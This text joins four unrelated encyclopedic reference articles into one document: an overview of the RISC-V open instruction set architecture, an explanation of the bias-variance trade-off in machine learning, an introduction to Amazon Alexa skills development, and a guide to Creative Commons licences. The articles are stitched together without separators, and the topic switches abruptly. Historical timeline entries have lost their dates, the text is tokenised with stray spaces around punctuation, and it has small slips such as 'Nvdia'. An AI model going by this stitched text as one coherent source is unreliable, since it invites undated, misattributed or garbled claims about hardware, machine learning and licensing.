Each computer hardware will support a particular ISA .
RISC - V is a free , open ISA that can be extended or customized for a variety of hardware or application requirements .
Apart from defining the instructions themselves , to be a success , any ISA requires broad industry support from chip manufacturers , hardware designers , tool vendors , compiler writers , software engineers , and more .
While RISC - V is still new , progress has been made in building a healthy ecosystem and the first RISC - V chips have been released .
It 's been said that the real value of RISC - V is enabling the software and tools community to develop around a single common hardware specification .
What 's the motivation for creating RISC - V ?
An overview of RISC - V. Source : Linus Tech Tips 2018 .
Many of the world 's PCs and laptops are based on Intel 's x86 architecture .
Many of the world 's smartphones and embedded devices are based on ARM architecture .
Both are proprietary and any use of these architectures involves licensing costs and may involve royalty fees .
Moreover , companies may lack full competency to design their proprietary ISA .
Another problem is long - time support .
For example , when DEC died , there was no one to support their proprietary ISAs Alpha or VAX .
One researcher claimed that security flaws such as Meltdown and Spectre are down to flaws in Intel 's instruction sets .
This is less likely when ISAs are open to inspection by a wide engineering community .
RISC - V is an open ISA .
It uses the BSD Open Source License .
This license does not restrict commercial use of the ISA .
Anyone implementing RISC - V is not required to release the source code of their RISC - V cores .
The license only requires that authors of RISC - V must be acknowledged .
An open ISA will permit software reuse , greater innovation and reduced cost .
Do we need RISC - V when there are other open ISAs ?
A comparison of open ISAs .
Source : Asanović and Patterson 2014 , pg .
2 .
The Creators of RISC - V considered and dismissed other open ISAs .
OpenRISC has technical shortcomings and little industry adoption .
OpenSPARC is suitable for servers but not for embedded devices and smartphones .
OpenSPARC is also licensed under GPLv2 , which may not attract support from commercial players .
RISC - V benefits from the mistakes of the past .
It has no burden to support legacy instructions .
It adopts RISC for its simplicity .
By leaving out delayed branches , RISC - V is kept simple and clean .
Other open ISAs are not modular .
RISC - V is modular so that the right balance of cost and efficiency can be attained for a particular application .
In particular , it can be customized for constrained IoT devices , smartphones / tablets or servers .
One claim states that LatticeMico32 is an open source RISC processor that some are already using and questions the need for RISC - V. They also state that the ecosystem is more important than having a perfect ISA .
What are some possible benefits of using RISC - V ?
Beyond saving on licensing or royalty fees , RISC - V has many benefits : Universal : As one of its goals , RISC - V should suit all sizes of processors , all types of implementations ( FPGA / ASIC / SoC ) , various software stacks , and various programming languages .
Modular : The ISA has a base specification plus optional extensions .
This means designers can leave out stuff they do n't need for their application .
Extensible : Designers can add custom instructions for specialized functions such as machine learning or security .
This is particularly important when Moore 's Law is ending .
Freedom : Designers have the freedom to work on their own optimized implementations and retain the choice to make their IP open .
Frozen : By freezing the ISA specifications , we can be certain that today 's software and tools will work on RISC - V systems many decades from now .
Adoption & Reuse : By being open , RISC - V will encourage wider adoption because of compatibility .
This enables reuse .
Could you compare RISC - V with alternative architectures ?
Comparing code sizes in different ISAs .
Source : Kanter 2016 , fig .
3 .
In terms of code sizes , one study found RISC - V compressed ISA ( RV32C ) is similar to Thumb-2 , while RV64C has better code density than its alternatives .
In terms of performance ( speed and power ) , there 's no reason to believe that RISC - V processors will fare worse than ARM or x86 processors .
It will be dependent on implementation : microarchitectural design , circuit design and processing technology .
Could you name some processors based on RISC - V ?
Because RISC - V is open , anyone can design and develop their own processors without licensing fees .
However , design and engineering costs can run into millions of dollars plus a delayed time to market .
It therefore makes sense to use IP cores or processors developed by others .
Some offer RISC - V IP cores that chip makers can license .
Among them are Andes Technology , Codasip , Bluespec , Cortus , and SiFive .
There are others who offer software cores that can run in FPGAs : Microsemi , Rumble Development , and VectorBlox .
SiFive has two families of licensable cores : the E Series and U Series .
They also offer these in silicon plus their development boards .
Freedom E310 ( FE310 ) is the first member of the Freedom Everywhere family .
India 's Shakti is a RISC - V chip developed at IIT Madras .
Lowrisc is a fully open - sourced , Linux - capable , RISC - V - based SoC currently being developed .
Their Rocket core currently runs on an FPGA .
The RISC - V Foundation maintains a list of RISC - V cores and SoCs .
What tools are available for developers who wish to work on RISC - V ?
Basic tools include compiler , assembler , disassembler , profiler , debugger , and linker .
Beyond these are IDEs , SDKs , simulators , and many more .
Tools are being developed and maintained by the team at UC Berkeley plus the wider community outside .
RISC - V supports GNU / GCC , GNU / GDB and LLVM .
Instruction Set Simulators ( ISS ) are available from Antmicro and QEMU .
Full IDEs are available from Imperas , Microsemi and SiFive .
SiFive 's Eclipse - based IDE is called Freedom Studio .
Tools are available to design your own RISC - V subsystem for FPGAs .
The RISC - V Foundation maintains the state of the current RISC - V software ecosystem .
Which operating systems have been ported to run on RISC - V ?
Different flavours of Linux have been ported to RISC - V , including Yocto .
In January 2018 , kernel version 4.6 was being used .
Researchers at the University of Cambridge have ported FreeBSD .
As of August 2018 , 80 % of the Debian software library has been compiled for RISC - V. Fedora / RISC - V project aims to bring the Fedora experience on RV64GC architecture .
Among the RTOS , Zephyr is planning a port as of August 2018 .
A port of FreeRTOS is also available .
Researchers at the University of California , Berkeley conceived RISC - V ( pronounced " risk five " ) as an ISA for research and education at Berkeley .
Previously , they used SPARC ISA and a modified MIPS ISA , but they want a unified ISA for future projects .
This is the fifth generation , following in the steps of four earlier generations in the 1980s .
Version 1.0 of the RISC - V base user - level ISA is published as volume 1 .
This version is not frozen .
Volume 2 is for supervisor - level ISA .
At about this time , the Raven-1 testchip is taped out using ST 28 nm FDSOI process node .
Version 2.0 of the user - level ISA has been published .
This is the final frozen version .
In January , the 1st RISC - V Workshop was organized in Monterey , CA .
To drive the future development and adoption of RISC - V , the RISC - V Foundation was established .
With more than 100 member organizations , this is an open collaborative community including both hardware and software innovators .
SiFive releases the Freedom E310 32-bit microcontroller at 320 MHz .
This is the first commercial RISC - V chip .
The CPU core is SiFive E31 and its ISA is RV32IMAC .
HiFive Unleashed dev board from SiFive carrying Freedom U540 SoC. Source : SiFive Crowd Supply 2018 .
SiFive released the U54-MC Coreplex , the first RISC - V - based chip that supports Linux , Unix , and FreeBSD .
It has 5 CPU cores : 4xU54 + 1xE51 .
This enables RISC - V processors to compete against ARM cores .
In February 2018 , SiFive released a development board named HiFive Unleashed for this chip .
It 's reported that commercial players including Western Digital and Nvdia plan to use RISC - V ISA for their next generation of products .
India 's Shakti RISC - V processor at 400 MHz boots up Linux .
The processor is based on Intel 's 22 nm FinFET process node .
The design of RISC - V instruction sets is modular .
Rather than take the approach of a large and complex monolith , a modular design enables flexible implementations that suit specific applications .
RISC - V defines base user - level integer instruction sets .
Additional capability to these are specified as optional extensions , thus giving implementations flexibility to pick and choose what they want for their applications .
The specifications of the base ISA have been frozen since 2014 .
Some of the extensions are also frozen while many others are being defined .
Could you give an overview of the RISC - V instruction set ?
RV32I instruction formats show immediate variants .
Source : Waterman and Asanović 2017 , fig .
2.3 .
RISC - V comprises a base user - level 32-bit integer instruction set .
Called RV32I , it includes 47 instructions , which can be grouped into six types : R - type : register - register I - type : short immediates and loads S - type : stores B - type : conditional branches , a variation of S - type U - type : long immediates J - type : unconditional jumps , a variation of U - type RV32I has ` x0 ` register hardwired to constant 0 , plus ` x1-x31 ` general purpose registers .
All registers are 32 bits wide but on RV64I they become 64 bits wide .
RV32I is a load - store architecture .
This means that only load and store instructions access memory ; arithmetic operations use only the registers .
User space is 32-bit byte addressable and a little endian .
Correspondingly , RV64I is for 64-bit address space and RV128I is for 128-bit address space .
The need for RV128I is debatable and its specification is evolving .
We also have RV32E for embedded systems .
RV32E has only 16 32-bit registers and makes the counters of RV32I optional .
What RISC - V extensions have been defined ?
Versions of the ISA base and extensions .
Source : Waterman and Asanović 2017 , pg .
i. RISC - V defines a number of extensions , all of which are optional .
Some of them are frozen and these are noted below : M : Integer multiplication and division .
A : Atomic .
F : Single - precision floating point compliant with IEEE 754 - 2008 .
D : Double - precision floating point compliant with IEEE 754 - 2008 .
Q : Quad - precision floating point compliant with IEEE 754 - 2008 .
C : Compressed instructions ( 16-bit instructions ) to yield about 25 - 30 % reduced code size .
" RVC " refers to compressed instruction set .
Among the evolving or future extensions are L ( decimal float ) , B ( bit manipulation ) , J ( dynamically translated languages ) , T ( transactional memory ) , P ( packed SIMD ) , V ( vector operations ) , N ( user - level interrupts ) , and H ( hypervisor support ) .
When multiple extensions are supported , that ISA variant can be described by concatenating the letters ; such as , RV64IMAFD .
To represent the standard general purpose ISA , " G " is defined as a short form for " IMAFD " .
RV32I uses one - eighth of the encoding space .
This means there 's plenty of room for custom extensions .
What are pseudo - instructions ?
To ease the job of an assembly language programmer or a compiler writer , some base instructions can be represented by what are called pseudo - instructions .
For example , a no operation is ` addi x0 , x0 , 0 ` for which ` nop ` is the pseudo - instruction .
Likewise , branch if zero is ` beq rs , x0 , offset ` for which ` beqz rs , offset ` is the pseudo - instruction .
What are privileged instructions ?
Application code usually runs in user mode or U - mode .
RV32I and RV32 G are user mode ISAs .
Two more modes are available : Machine mode ( M - mode ) : For running trusted code .
This is the most privileged mode in RISC - V and has complete access to memory , I / O and anything else to boot and configure the system .
Its most important feature is to handle synchronous exceptions and interrupts .
The simplest RISC - V microcontrollers need to support only M - mode .
Supervisor mode ( S - mode ) : For supporting the operating system needs of say Linux , FreeBSD or Windows .
This is more privileged than U - mode but less privileged than M - mode .
Where the OS needs to process exceptions / interrupts , exception delegation is used to pass control to S - mode selectively .
S - mode also provides a virtual memory system .
Could you describe some technical considerations in the design of RISC - V instructions ?
Comparing RISC - V RV32IMAF with Epiphany ISA .
Source : Olofsson 2014 , fig .
1 .
The design of RISC - V ISA considered cost , simplicity , performance , implementation - independence , room for growth , program size , and ease of use .
RV32I includes 32 integer registers , making it easier for compilers to use them more often than memory .
By keeping instructions simple , RISC - V instructions typically require only one clock cycle and deliver predictable performance .
For dynamic linking , it adopts PC - relative branches .
The Instructions offer three registered operands , avoiding the extra movement required by ISAs with only two registered operands .
These are also in the same position so that access can begin before decoding the instruction .
The design was also informed by mistakes of other ISAs .
For example , the initial Alpha ISA did not have byte or half - word load / store .
The shift operation in ARM can be seen as an overdesign .
Delayed branches of MIPS and SPARC affected their ISAs .
ARM Thumb and MIP16 added 16-bit instructions in hindsight .
Are RISC - V instructions without precedents ?
Desirable features as supported in earlier ISAs .
Source : Waterman 2016 , table 2.1 .
When we consider the 122 instructions of RV32 G , only 6 of them are without precedents .
98 instructions appear in at least three prior ISAs .
18 instructions appear in one or two prior ISAs .
This study included 18 prior RISC ISAs , including the CDC 6600 dating back to 1964 .
It 's been commented that one can not design a flawless ISA , nor an ISA with flaws doomed to fail .
RISC - I is defined by David A. Patterson at UC Berkeley as an alternative to the increasingly complex instructions of the computers of the day .
This is followed by RISC - II ( 1983 ) , SOAR ( 1985 ) and SPUR ( 1986 ) projects .
Researchers at UC Berkeley consider RISC - V as the fifth generation of their RISC design from the 1980s .
Version 1.0 of the RISC - V base user - level ISA is published as volume 1 .
This version is not frozen .
Volume 2 is for supervisor - level ISA .
Version 2.0 of the user - level ISA has been published .
This is a frozen version .
Version 2.2 of the user - level ISA has been published .
This does not modify the ISA base plus extensions IMAFDQ version 2.0 .
Extension C is frozen in this version .
In statistics and machine learning , we collect data , build models from this data and make inferences .
too little data , the model is most likely not representative of the truth since it 's biased in what it sees .
too much data , the model could become complex if it attempts to deal with all the variations it sees .
Ideally , we want models to have low bias and low variance .
In practice , lower bias leads to higher variance , and vice versa .
For this reason , we call it a Bias - Variance Trade - off , also called Bias - Variance Dilemma .
There are techniques to address this trade - off .
The idea is to get the right balance of bias and variance that 's acceptable for the problem .
A good model must be rich enough to express the underlying structure in data and simple enough to avoid fitting spurious patterns .
Could you explain the bias - variance trade - off with examples ?
Suppose we collect income data from multiple cities across professions .
While income can be correlated with profession , there will be variations across cities due to differing lifestyles , cost of living , tax rules , etc .
For example , a doctor in London would have a higher income than a doctor in Leicester .
This can be called heterogeneity in data .
In regression modelling , a model built on this data will have high variance and predictions may not be accurate .
We can overcome this by making the data more homogeneous by splitting the data by city .
Thus , we 'll end up with multiple models , one per city .
Each model is biased to its city but has less variance .
We could also choose to split the data by state or region .
The amount of variance that can be tolerated will dictate bias .
Consider the KNN classification as another example .
At low \(k\ ) , predictions are not consistent due to high variations .
When we consider more neighbours , we get better predictions as variance is reduced .
However , if \(k\ ) is too high , we start considering neighbours that are " too far " , which contributes to increased bias .
What 's the intuition behind the bias - variance trade - off ?
Graphical illustration of bias - variance trade - off .
Source : Fortmann - Roe 2012 , fig .
1 .
Assume we 're building a prediction model .
We build multiple models from different data samples .
Bias is a measure of how far the predictions are from the true value .
Variance is a measure of variability across these models .
This is illustrated graphically with a bulls - eye diagram .
Intuitively , we can say that a biased model is too simple .
It 's unable to capture essential patterns in the training data .
We say that such a model underfitting the data .
On the other hand , a model with high variance is a complex model .
It 's in fact , sensitive to the training data .
It 's overfitting the data .
When it sees new data , it 's unable to predict correctly since it 's overfitted to the training data .
We might also state that such a model does not generalize well .
A simpler model would have done better , but if it becomes too simple it also becomes biased .
In summary , a biased model is underfitted and of low complexity .
A model of high variance is overfitted and of high complexity .
What 's the math behind bias - variance trade - off ?
Prediction error versus model complexity .
Source : Wågberg 2020 , slide 23 .
Given x - y data points , we can represent the relationship as \(Y = f(X ) + \epsilon\ ) , where \(\epsilon\ ) is the error term of Normal distribution \(N(0,\sigma_\epsilon)\ ) .
Let \(\hat{f}(X)\ ) be an estimate of \(f(X)\ ) obtained via any modelling technique such as linear regression or KNN .
Let 's use mean squared error for the prediction error .
Thus , the expected prediction error at point \(x\ ) is , $ $ \begin{align}\Bbb{E}[(y - \hat{f}(x))^2 ] = & \ ; \Bbb{E}[(f(x ) - \Bbb{E}[\hat{f}(x)])^2 ] \\ & + \Bbb{E}[(\hat{f}(x ) - \Bbb{E}[\hat{f}(x)])^2 ] \\ & + { \sigma_\epsilon}^2\end{align}$$ The first term is the squared bias of the estimator .
The second term is the variance of the estimator .
The third term is simply noise .
A perfect model would eliminate both bias and variance , but not the noise .
Noise contributes to what we call irreducible errors .
\(\Bbb{E}[\hat{f}(x)]\ ) is the average prediction from various estimators .
Each estimator is trained on a different sampling of the dataset .
The idea of separating and analysing bias and variance terms of the prediction error is called bias - variance decomposition .
Perfect models do n't exist .
In practice , we aim for a model that attempts to minimize errors , neither underfitting nor overfitting .
Could you explain specific examples of high / low bias / variance ?
Top : high bias , low variance ; Bottom : low bias , high variance .
Source : Rojas 2015 , fig .
1 .
In this example , we use \(f(x)\ ) for the underlying process ( purple ) and \(\hat{f}(x)\ ) for our estimate of the process ( orange ) .
Individuals fit functions ( orange ) are averaged to give \(\Bbb{E}[(\hat{f}(x)]\ ) ( green ) .
Consider a nonlinear process \(f(x)\ ) ( top figure ) .
We do n't know that it 's nonlinear .
We attempt to fit a linear function \(\hat{f}(x)\ ) to the data .
The data may also contain noise .
We take different samples of the data and find suitable fits .
None of the lines are close to \(f(x)\ ) .
Thus , our fits are all biased , in fact , biased towards linear functions .
However , all lines are not too different , which implies low variance .
Now consider a linear process \(f(x)\ ) ( bottom figure ) .
We now attempt to fit a nonlinear function \(\hat{f}(x)\ ) to the data .
The functions are complex enough to fit the data and the noise .
In fact , it 's overfitting .
Each nonlinear curve fits its own data and the curves all look different .
Thus , our model \(\hat{f}(x)\ ) exhibits high variance .
When we average these fits , we get a line that is close to the original process .
Thus , there 's a low bias .
How can I calculate the bias and variance of my model ?
Bias / variance error terms are decomposed and compared to training / test set errors .
Source : Stansbury 2020 , fig .
4 .
Bias and variance can be calculated only when we have multiple estimators , each trained on a different dataset .
In practice , we usually have a single dataset to train an estimator .
In such a case , we can use bootstrapping or cross validation .
We do n't usually calculate bias and variance .
Instead , the dataset is divided into training and test sets .
The model is trained on the training set .
It 's then evaluated for the prediction error on the test set .
This is equivalent to selecting the best one from a candidate list of estimators using bias and variance of each estimator .
This similarity can also be observed with the error curves for \({Bias}^2 + Variance\ ) and the test set .
Overfitting can be observed when the training set error drops but the test set error increases .
This is often an indication to consider a simpler model .
Equivalently , in neural networks , it 's an indication to stop the training process .
It 's important that the test set is not used for training .
Otherwise , it 's difficult to assess the model 's performance .
What are some possible methods to overcome bias - variance trade - off ?
A common myth is to minimize bias at the expense of variance .
It 's important to minimize both .
Resampling techniques such as bagging and cross validation help to reduce variance without increasing bias .
With such techniques , we build multiple models and predict using an ensemble of these models .
A specific example is random forests used for classification .
The variance of a single decision tree is reduced by random forests .
The penalty is memory and computation due to multiple models .
Bagging reduces variance with little effect on bias .
Boosting is a technique to reduce bias .
In practice , boosting can hurt performance on noisy data .
Moreover , boosting is known to increase variance at an exponential decaying rate , which some call an exponential bias - variance trade - off .
Is a bias - variance trade - off applicable to neural networks ?
Effect of ResNet width and depth on bias and variance .
Source : Adapted from Yang et al .
2020 , fig .
5 .
Historically , it was believed that the trade - off applies to neural networks as well .
To address the trade - off , early stopping and dropping are techniques to avoid overfitting .
In the 2010s , neural networks challenged the classical bias - variance trade - off .
The classical U - shaped risk curve was replaced with a double - descent risk curve .
While bias decreases monotonically , variance first increases and then decreases after a point called the interpolation threshold .
Beyond this point , as more parameters are added , the network performs better .
In fact , this behaviour has been observed not just with neural networks but also with ensemble methods such as boosting and random forests .
In particular , performance is influenced by both the width and depth of the network .
Bias decreases as width increases .
Variances decreases as width increases beyond the threshold .
As depth increases , bias decreases and variance increases by a lesser amount .
Deeper networks generalize better and this is mainly due to lower bias .
Where exactly is the bias - variance trade - off relevant ?
The Bias - variance trade - off applies to supervised machine learning .
It applies to both classification problems and regression problems .
In general , it can be a useful conceptual framework when modelling any complex system .
The trade - off has been useful in analyzing human cognition .
Given limited training data , we rely on high - bias , low - variance heuristics .
These heuristics are fairly simple but generalize well to a wide variety of situations .
Tasks such as object recognition use some " hard wiring " that 's later fine tuned by experience .
Do humans learn concepts based on prototypes ( high bias , low variance ) or exemplar models ( low bias , high variance ) ?
This sort of question can be investigated by the bias - variance trade - off .
In program analysis , precise abstractions may not lead to better results and bias - variance trade - off has been used to explain this .
In fact , a tool produced using cross validation had better running time , found new defects and experienced fewer timeouts .
In reinforcement learning with partial observability , there 's a similar trade - off between asymptotic bias and overfitting .
A smaller state representation might decrease the risk of overfitting , but at the cost of increasing asymptotic bias .
In a paper titled On empirical spectral analysis of stochastic processes , Grenander introduces what he calls the uncertainty principle .
He states , " if we want high resolvability we have to sacrifice some precision of the estimate and vice versa .
" The term resolvability relates to bias whereas the term precision relates to variance .
( a ) Controlled variance .
( b ) Controlled bias .
( c ) Smooth fit via cross validation .
Source : Geman et al .
1992 , fig .
2 .
Given discrete , noisy observations , Wahba and Wold show how a smooth curve can be fitted to the data via cross validation .
Smoothing can be done to control variance or bias .
Cross validation helps in controlling both and obtaining a better fit .
Hastie and Tibshirani discuss the bias - variance trade - off in the context of regression modelling .
This is just an example to show that the trade - off was well known by the 1980s .
Geman et al .
note that a feedforward neural network trained by error backpropagation is essentially nonparametric regression .
It 's a model - free approach but requires lots of training data and is slow to converge .
A model - based approach learns faster , but is also biased : it ca n't address complex inference problems .
They therefore state the trade - off clearly , " whereas incorrect models lead to high bias , truly model - free inference suffers from high variance .
" Historically , bias - variance trade - off started in regression with squared loss as the loss function .
For classification problems , zero - one loss is used .
For classification , Kong and Dietterich show that ensembles can reduce bias .
In 1996 , Breiman showed that ensembles can reduce variance .
Schapire et al .
show that ensembles enlarge the margins and thereby enable models to generalize better .
Domingos proposes a unified bias - variance decomposition that can be applied to any loss function ( squared loss , zero - one loss , etc .
) .
The decomposition is not always additive .
He notes that bias - variance trade - off behaviour is dependent on the loss function .
Domingos also shows that Schapire 's margin - based approach is equivalent to a bias - variance - based approach .
An ensemble 's generalization error can be expressed either as the distribution of the margins or as bias - variance decomposition of the error .
Valentini and Dietterich performed bias - variance analysis on Support Vector Machines ( SVMs ) to get insights into how SVMs learn .
They observe the expected bias - variance trade - off , but they also see complex relationships , especially in Gaussian and polynomial kernels .
They propose how bias - variance decomposition can be used to develop ensemble methods using SVMs as base learners .
Neal et al .
observe that since the mid-2010s , empirical results show that wider networks generalize better .
The classical U - shaped test error curve due to bias - variance trade - off is being defied by neural networks .
In their experiments , they show that bias and variance decrease as more parameters are added to the network .
Amazon Alexa logo .
Source : Amazon Developer Docs 2018d .
Amazon Alexa is a cloud - based voice service that brings natural voice experiences to users .
It can be seen as a virtual assistant with the capability to interact with users using voice rather than traditional computer interfaces of keyboard , mouse or monitor .
Initially , Alexa was released as the backendsupportservice for Amazon 's Echo device , a voice - activated connected speaker .
Since then , Alexa has become smarter .
It 's been used with a number of products beyond Amazon 's Echo series of devices .
It 's moved from being just a smart speaker to the central control of your smart home .
What are typical uses of Amazon Alexa ?
An introduction to Alexa .
Source : Alexa Developers YouTube 2016 .
When Amazon Echo was released in 2014 , Alexa could answer basic questions , add items to a shopping cart or play your favourite music album .
Today , developers can add new capabilities to Alexa .
Capabilities exist for managing chores , telling stories , quizzing , and gaming .
Alexa can integrate with web services for ordering something , getting information , etc .
It can control or query smart devices connected to the cloud .
For example , you can ask to see the feed from a remote camera or dim the lights .
In fact , Alexa 's importance in the smart home is set to grow as it aims to handle complete home automation .
In terms of some specific examples , the Xbox One console will soon support Alexa so that gamers can issue voice commands .
A number of lighting solutions can be controlled via Alexa : Philips Hue LED , Lifx , TP - Link , Osram , Stack LED .
In the healthcare space , Alexa has been used to get information on drug side - effects , medication schedule or gather patient surveys .
As a developer , what can I build with Alexa ?
With Alexa , three things are possible : Develop capabilities for Alexa for new use cases .
These capabilities are called skills .
Alexa Skills Kit ( ASK ) is a set of APIs , tools and documentation to help you develop skills .
If you wish to create a hands - free voice interface in your own products , use the Alexa Voice Service ( AVS ) .
Your products can then leverage Alexa 's features .
A simple example is to make your Raspberry Pi work with Alexa as explained in a detailed tutorial .
Let your customers control their connected devices in smart homes and other gadgets .
Devices can reach Alexa via the Internet or via a local hub .
Developers need to use the Smart Home Skill API and the Gadgets API .
What are the languages supported by Alexa ?
As of August 2018 , Alexa 's skills can support English , French , German , Italian , Japanese and Spanish .
A device ( such as Echo ) when set to a particular language can access any skill available in that language .
As a developer , you can publish your skills in multiple languages to target a wider user base .
From a programming perspective , if the business logic of your skill is deployed on AWS Lambda , then any programming language that Lambda supports can be used : Node.js , Java , Python , or C # .
Or you can deploy it as a web service on any cloud infrastructure .
This means that you can code in any language , though the data is JSON via REST .
What 's the architecture of Alexa ?
Alexa referenced architecture .
Source : Jensen 2017 .
Alexa resides in the cloud .
Access is via the Alexa Voice Service API .
Alexa receives requests for speech streams .
Alexa analyzes the speech and identifies the requested skill .
A structured representation of the skill and intent is created .
Now there are two possible paths .
If the skill code is deployed in AWS Lambda , that service will be triggered within AWS .
If it 's a web service accessed via HTTPS , then the REST API call is made .
In either case , Alexa will receive the response as a text .
Optionally , the response may have images .
Alexa will convert the text into speech , which gets streamed to the user via their current device .
Images will be served where the device has a display .
A skill is identified by an invocation name and mapped to a backend service .
A skill can be designed to do multiple things , each of which is called an intent .
Each intent can be identified by one or more words or phrases , each of which is called an utterance .
For example , you may create a travel - related skill that has three intents : renting a car , booking a flight , or booking a hotel .
Could you define some Alexa - specific terminology ?
An illustration of some key Alexa terms .
Source : Amazon Alexa 2018b .
Here are a few essential terms and more are available in the Alexa Skills Kit Glossary : Skills : A capability of Alexa .
Alexa comes with built - in skills , such as playing music .
Developers can also build new skills .
Intents : The main request or action associated with the user 's command for a custom skill .
Slots : Arguments to an intent that provide Alexa with more information .
These can be required or optional .
Utterances : Words users say to convey what they want Alexa to do or in response to a question .
Interaction Model : The words and phrases users can say to make a skill do what they want .
It determines the requests the skill can handle and the words users say to invoke those requests .
Invocation : The act of beginning an interaction with a particular Alexa ability .
Wake word : A word that " wakes up " Alexa for a task .
Typically , this word is " Alexa " .
Cards : Elements displayed in a visual interface to describe or enhance voice interaction .
What technologies power Alexa under the hood ?
A banking app chatbot using Lex and Polly but without Amazon Alexa .
Source : Amazon Web Services 2018 .
Two fundamental technologies required to make Alexa work are speech - to - text and text - to - speech conversions .
To make these work reliably , Alexa employs deep learning algorithms .
More specifically , we have two technologies , both of which were released to developers in November 2016 : Amazon Lex : This does speech - to - text conversion using techniques of Automatic Speech Recognition and Natural Language Understanding .
It can be used independently of Alexa to build conversational interfaces ( such as chatbots ) using a mix of voice and text .
Amazon Polly : This does the text - to - speech conversion by synthesizing speech in various languages and accents .
In May 2018 , Alexa developers got access to eight different voices from Amazon Polly .
In fact , we can use Speech Synthesis Markup Language ( SSML ) to generate natural - sounding speech .
One researcher showed how SSML can be used to teach Alexa to speak with a Boston accent .
What resources are available to learn about programming for Alexa ?
A good place to start is the Voice Design Guide .
This includes a design checklist and a glossary .
There are also guides on using Amazon Skill Builder .
As a tutorial , you can start with this 6-step tutorial to build a better skill .
An easier way to get started is to use Alexa Skill Blueprints .
These are templates that you can customize to make your own skill .
Alexa on GitHub contains open source code .
There are some useful developer tools .
There are also open - source frameworks for building voice apps .
Two such frameworks are Jovo and Violet .
These frameworks are cross - platform ; that is , from a single codebase they can target Amazon Alexa , Google Assistant , etc .
Though not open source , Alexa Flow is a tool to easily create , manage and host your custom skills without coding knowledge .
An alternative is Storyline , which offers a visual drag - n - drop design interface , previews , deployment and analytics .
Many more tools , SDKs and platforms are listed in Wolter 's blog .
Blogs specific to Alexa are useful to get the latest news or learn best practices .
From the main Alexa website , you can access all Alexa - specific documentation .
First Echo device and what it could do .
Source : Bishop 2014 .
Amazon Echo becomes available by invite only to select Amazon Prime customers .
This is a voice - activated connected speaker that can act on user requests or answer basic questions .
It 's actually powered in the cloud by a virtual assistant called Alexa .
To enable third - party integration of Alexa into their connected devices , Alexa Voice Service ( AVS ) has been released .
In April 2016 , Invoxia became the first maker to release an Alexa service on a non - Amazon device .
Called Triby , it 's a kitchen device that can set timers , play music or read sports scores .
The Alexa Smart Home API has been launched .
In May 2017 , with the Smart Home Skill API , both users and developers can use appliance categories ( camera , light , smartlock , etc .
) to easily identify device types .
An Example screenshot of Alexa Skill Builder showing utterances .
Source : Adapted from Kim 2018a .
Amazon brings out the Alexa Skill Builder , a more intuitive interface to build skills , including the interaction model and multi - turn dialogues .
Work on this started back in October 2016 .
Amazon releases Alexa Skill Blueprints .
These are skill templates that you can customize rather than develop custom skills from scratch .
Developers can not sell Alexa skills but Amazon enables In - Skill Purchasing ( ISP ) .
If a skill drives user engagement , Amazon also offers rewards to developers .
Amazon released a preview in which developers can choose any of eight U.S. English voices to narrate skills .
This is powered by Amazon Polly .
Amazon releases Alexa Auto SDK on GitHub .
Automobile makers can integrate Alexa directly into their vehicles .
Amazon announces Quick Start Templates to accelerate skill development for popular skill samples .
Works such as photographs , digital artwork , an essay , etc .
are automatically protected by copyright .
Anyone who wants to use these works has to ask the copyright owner for permission .
This is not ideal for a creator who wishes to share his or her own works more openly .
This is the problem that the Creative Commons organization aims to address with its licenses .
There are different types of CC licenses giving users different levels of openness .
In essence , these licenses are legal tools to give users permission in advance to share and use the works .
While copyrights state " all rights reserved " , CC licenses state " some rights reserved " .
Ultimately , CC is a framework that fosters openness and changes the way we share , collaborate , remix and reuse content .
What 's the case for Creative Commons licensing ?
An introduction to Creative Commons .
Source : Creative Commons Vimeo 2010 .
Copyright law can be traced back to the sixth century , but it was only in 1710 that it became an act of Parliament ( in Great Britain ) through the Statute of Anne , also known as the Copyright Act 1710 .
This law granted creators the right to protect their works and set the terms on which their works may be used by others .
Initially for books , it was later applied to translations , maps , paintings , photographs , motion pictures and computer programs .
Copyright is automatic .
This has become a problem in a connected world .
It went against the Internet 's culture of sharing and collaboration .
Creators who had no problems with others using their works , had no way to tell people about their intentions .
Users who wished to reuse the open works of others had no legal framework to do so .
There was therefore a need for an open license .
In the late 1990s , the GNU GPL license was available but it was tailored for software .
It was n't suited for cultural works .
Moreover , for cultural works , one requires a range of options to give creators the choice of licensing .
Which popular platforms have adopted Creative Commons licensing ?
Some popular adopters of CC licensing .
Source : Creative Commons 2018d .
Flickr , Wikipedia , YouTube and Vimeo are some popular adopters of CC licensing .
Among research communities , PLOS is a big adopter .
Within Springer Nature , on the bioRxiv preprint server , most articles use CC licensing .
The blogging platform Medium adopted CC licensing back in 2015 .
The Free Software Foundation ( FSF ) recommends the use of CC0 for releasing any work into the public domain .
The White House website uses CC licensing .
In 2015 , Europeana had about 8 million cultural objects using a CC license and another 9 million using Public Domain Mark .
Wikimedia common allows the use of CC0 , CC - BY and CC - BY - SA .
Is n't the Creative Commons legal jargon intimidating for common users ?
CC licenses are composed of three layers .
Source : Park 2011 .
While it 's true that the legal language is often difficult to understand for common users , there 's an alternative version that offers a simplified explanation of the licenses .
While the legal code is the actual license , it is sufficient for users to read the simpler version .
Called Commons Deed , it 's the " human - readable " version of the licenses .
There 's also a third layer that makes it easier for search engines and other software tools to identify works that are using CC licenses .
Such information is embedded into web pages , not visible on the pages to people but can be parsed by search engines .
The Creative Commons website illustrates one approach to adding metadata wherever CC - licensed is reused .
It uses Dublin Core to do this .
What are the different Creative Commons licenses available for use ?
Multiple CC licenses are available at different levels of openness .
Source : WUR 2018 .
There are six different CC licenses : CC BY , CC BY - SA , CC BY - NC , CC BY - ND , CC BY - NC - SA , CC BY - NC - ND .
All six licenses permit copying and publishing of the works .
BY implies that attribution to the original author is required .
Attribution is mandatory on all CC licenses .
Anything marked with NC implies only non - commercial use is allowed .
Anything marked with ND implies no derivative use : you can not modify or adapt the original work .
Anything marked with SA implies share alike , meaning that derived works must be released under the same license as the original work .
From the above understanding , we can say that CC BY is the most open and CC BY - NC - ND is the least open .
CC BY - NC - ND is still better than a copyright since the work in its original form can be shared or reused non - commercially with attribution .
In 2014 , it was seen that one - third of CC licenses in use were CC BY , 76 % allowed remixing and 58 % allowed commercial use .
What 's CC0 ?
How 's it different from works in the public domain ?
Symbols that indicate CC0 and public domain .
Source : Merkley 2015 .
CC0 allows creators to place their work as nearly as possible in the public domain .
When a copyright expires , the work comes into the public domain .
Creative Commons has defined a symbol to indicate this with its Public Domain Mark ( PDM ) , in addition to another symbol that indicates CC0 .
CC0 is useful when the copyright has not expired but the copyright owner willingly gives up the rights so that others can freely reuse the work .
